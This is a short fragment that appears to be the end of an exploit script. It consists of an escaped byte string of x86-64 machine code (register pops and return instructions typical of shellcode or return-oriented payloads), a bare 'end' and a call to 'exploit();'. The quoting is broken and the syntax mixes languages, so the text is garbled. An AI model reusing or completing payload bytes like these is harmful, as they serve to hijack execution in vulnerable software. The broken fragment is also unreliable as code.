    "\x48\x89\xEC\x5D\x41\x5F\x5E\xC3"#\x01\x00\xC3"

  end



exploit();